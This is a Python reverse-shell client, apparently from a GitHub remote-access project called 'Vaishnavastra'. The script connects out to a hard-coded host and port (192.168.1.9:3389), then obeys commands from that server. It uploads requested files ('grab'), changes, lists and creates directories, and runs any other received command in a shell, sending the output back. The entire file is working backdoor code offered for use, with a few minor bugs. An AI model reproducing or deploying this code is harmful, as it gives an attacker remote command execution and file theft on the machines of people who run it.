#By SxNade
#https://github.com/SxNade/Vaishnavastra
#CONTRIBUTE

import socket
import subprocess
from termcolor import colored
import os
#importing the required libraries

#defining a transfer function to process files to be downloaede
def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('FILE NOT FOUND'.encode())


def connecting():
    s = socket.socket()
    s.connect(("192.168.1.9", 3389))

    while True:
        command = s.recv(8192)
        if 'exit' in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab, path = command.decode().split("*")
            try:
                transfer(s, path)
            except:
                pass
        elif 'cd' in command.decode():
            code, directory = command.decode().split('*')
            try:
                
                os.chdir(directory)
                s.send(('[+]Current dir is ' + os.getcwd()).encode())
            except Exception as e:
                s.send(('[-] ' + str(e)).encode())
        elif ' dir' in command.decode():
          #  code, directory = command.decode().split('*')
             try:
              directorio = os.getcwd()
              msg='[+]List all directories of current directory :'
             
              # Comprobación de existencia y si es un directorio
              if os.path.exists(directorio) and os.path.isdir(directorio):
                contenido = os.listdir(directorio)
              # Mostrar los elementos del directorio
                for elemento in contenido:
                  msg=msg+'\n '
                  msg=msg+elemento
               
                s.send((msg).encode())
             except Exception as e:
              s.send(('[-] ' + str(e)).encode())
        elif 'mkdir'in command.decode():
             code, nuevo_directorio = command.decode().split('*')

             try:
               directorio = os.getcwd()
               # Comprobación de existencia y si es un directorio
               if os.path.exists(directorio) and os.path.isdir(directorio):
                 contenido = os.listdir(directorio)
                 # Creando un directorio
                 # Nombre del nuevo directorio
                 lista = command.decode().split('*')
                 
                 # Ruta completa del nuevo directorio
                 ruta_nuevo_directorio = os.path.join(directorio, nuevo_directorio)

                 # Comprobación de existencia y si es un directorio
                 if not os.path.exists(ruta_nuevo_directorio):
                   # Crear el nuevo directorio
                   os.makedirs(ruta_nuevo_directorio)
                   mensaje = f'[+] Directorio "{nuevo_directorio}" creado con éxito en {directorio}'
                 else:
                   mensaje = f'[-] El directorio "{nuevo_directorio}" ya existe en {directorio}'
                   s.send((mensaje).encode())
               else:
                  print("El directorio no existe o no es válido.")
             except Exception as e:
                s.send(('[-] ' + str(e)).encode())
        else:
            #running the command received by the server & also sending the result or encountered while processing
            CMD = subprocess.Popen(command.decode(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
            s.send(CMD.stdout.read())
            s.send(CMD.stderr.read())

#defining a main function to run the whole program 
def main():
    connecting()

#finally running the main function to start the server!
main()


